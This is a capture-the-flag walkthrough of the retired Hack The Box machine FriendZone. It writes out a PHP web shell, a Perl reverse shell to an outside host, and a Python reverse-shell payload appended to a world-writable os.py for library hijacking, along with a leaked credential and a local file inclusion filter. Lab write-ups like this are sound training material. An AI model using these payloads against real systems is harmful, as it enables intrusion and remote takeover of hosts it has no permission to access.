## Background

FriendZone is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.123 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-10 12:52:26 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 21/tcp on 10.10.10.123                                    
Discovered open port 22/tcp on 10.10.10.123                                    
Discovered open port 80/tcp on 10.10.10.123                                    
Discovered open port 137/udp on 10.10.10.123                                   
Discovered open port 53/udp on 10.10.10.123                                    
Discovered open port 53/tcp on 10.10.10.123
Discovered open port 443/tcp on 10.10.10.123
Discovered open port 445/tcp on 10.10.10.123                                   
Discovered open port 139/tcp on 10.10.10.123
```

Whoa! `masscan` finds seven open TCP ports. Let's do one better with `nmap` scanning the discovered ports.

```
# nmap -n -v -Pn -p21,22,53,80,139,443,445 -A --reason -oN nmap.txt 10.10.10.123

Jeez. There are so many services I don't know where to start! Let's start with SMB or Samba in this case. We can use null session to enumerate the shares like so.


{% include image.html image_alt="120d123a.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/120d123a.png" %}


Excellent. We have a couple of shares that we can explore.

### Information Disclosure

Among the three shares, we can mount `general` and `Development` without any credentials.

```
# mount -t cifs -o username=guest,rw //10.10.10.123/general ./general
# mount -t cifs -o username=guest,rw //10.10.10.123/Development ./development
```

In `general`, there's a file `creds.txt` that looks like this.


{% include image.html image_alt="25094e7e.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/25094e7e.png" %}


Meanwhile, in `Development`, I can write files to it and it's already crowded with files. I'm pretty sure these files weren't there when the box was created. :smirk: Too bad the credential (`admin:WORKWORKHhallelujah@#`) can't mount the `Files` share. I'll just have to keep this in mind while I explore other services.

### DNS Zone Transfer

Let's turn our attention on the `http` service. This is how it looks like on the browser.


{% include image.html image_alt="44c8140d.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/44c8140d.png" %}


Ouch!

There's our first clue. Recall the box runs a DNS service? The DNS server probably takes care of the `friendzoneportal.red` zone? Let's see if we can do a zone transfer on the box.


{% include image.html image_alt="b5cd665f.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/b5cd665f.png" %}


Awesome. Experience tells me I should put those subdomains into `/etc/hosts`.

```
# echo -e "10.10.10.123\t$(host -l friendzoneportal.red 10.10.10.123 | grep "has address" | cut -d' ' -f1 | tr '\n' ' ')" >> /etc/hosts
```

But, wait. There's another zone—`friendzone.red` exposed by the `ssl/http` service, discovered in our `nmap` scan.


{% include image.html image_alt="569e34c9.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/569e34c9.png" %}


Same thing. Put these subdomains to `/etc/hosts`.

```
# echo -e "10.10.10.123\t$(host -l friendzone.red 10.10.10.123 | grep "has address" | cut -d' ' -f1 | tr '\n' ' ')" >> /etc/hosts
```

### In the Zone

The domain `friendzoneportal.red` is a rabbit hole. Suffice to say, I've done my enumeration and it didn't yield any useful results. Meanwhile, the domain `friendzone.red` is the real deal under `https`. Check this out.

_administrator1.friendzone.htb_


{% include image.html image_alt="84984bd6.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/84984bd6.png" %}


_uploads.friendzone.htb_


{% include image.html image_alt="caeefff6.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/caeefff6.png" %}


Recall the credentials earlier? Perhaps it'll work with this admin THING? :wink:


{% include image.html image_alt="9468559f.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/9468559f.png" %}


It worked!


{% include image.html image_alt="9f8d715b.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/9f8d715b.png" %}


Let's do as told and visit `/dashboard.php`, shall we?


{% include image.html image_alt="dcc593b8.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/dcc593b8.png" %}


Looking at the hint on the page, I suspect a local file inclusion (LFI) vulnerability is in the cards. Let's test it out.


{% include image.html image_alt="19fbf425.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/19fbf425.png" %}


I strongly suspect a `timestamp.php` page is present.


{% include image.html image_alt="88780c18.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/88780c18.png" %}


Ha Ha! An inexperienced developer. Now that I know a LFI vulnerability is present, I need a way to exploit it to read files. Enter PHP Filter.

Using the following filter, I was able to ignore another rabbit hole—the `uploads` page. I'm not even going to show the `dashboard.php` code. It's not a pretty sight.

```
pagename=php://filter/convert.base64-encode/resource=/var/www/uploads/upload
```

See? You are never going to upload anything.

```php
<?php
  // not finished yet -- friendzone admin !
  if(isset($_POST["image"])) {
    echo "Uploaded successfully !<br>";
    echo time()+3600;
  } else{
    echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";
  }
?>
```

Recall that I was able to write to `Directory`? Let's write a small PHP file to prove that we are able to run PHP code.

<div class="filename"><span>info.php</span></div>

```
# echo "<?php phpinfo(); ?>" > info.php
```

In the shares comment, `Files` was shown to be mapped to `/etc/Files`. By extension, `Development` should be mapped to `/etc/Development`.


{% include image.html image_alt="dfab6015.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/dfab6015.png" %}


Awesome. Now, let's step up the game and write another small PHP file, that allows us to execute remote commands.

<div class="filename"><span>cmd.php</span></div>

```
# echo '<?php echo shell_exec($_GET[0]); ?>' > cmd.php
```


{% include image.html image_alt="5f0a0cde.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/5f0a0cde.png" %}


Sweet. Time to get ourselves a Perl reverse shell.

## Low-Privilege Shell

Here's the Perl one-liner I use.

```
perl -e 'use Socket;$i="10.10.12.246";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

Of course, it's best to `urlencode` it to prevent complications in the browser's address bar.


{% include image.html image_alt="14648ca0.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/14648ca0.png" %}


Better [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) my shell to a full TTY.

## Privilege Escalation

During enumeration of `www-data`'s account, I saw the credentials of `friend` lurking in `/var/www/mysql_data.conf`.


{% include image.html image_alt="65694d11.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/65694d11.png" %}


The funny thing is MySQL is not even running! Well, let's `su` ourselves as `friend`.

The file `user.txt` is at `friend`'s home directory.


{% include image.html image_alt="38a7e04a.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/38a7e04a.png" %}


Moving on, I noticed two interesting pieces of information:

+ `/usr/lib/python2.7/os.py` is world-writable
+ `/opt/server-admin/report.py` imports the `os` module

I think I know where this is going: privilege escalation via python library hijacking. If I had to guess, I would say there's a `cron` job running as `root` that executes `/opt/server-admin/reporter.py`.

Here's the game plan.

First, I log it to `friend` via SSH. This is easy since I already have `friend`'s password. Then I `scp` a copy of `os.py` over to the box with the following code appended.

```
import os, socket, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.12.246',4321))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()
```

Two minutes later, a `root` shell appears in my `nc` listener.


{% include image.html image_alt="b9ab4cc0.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/b9ab4cc0.png" %}


Getting `root.txt` is trivial with a `root` shell.


{% include image.html image_alt="c0596592.png" image_src="/26c4ea7d-c8af-4acb-8bae-d8fae2a161fe/c0596592.png" %}
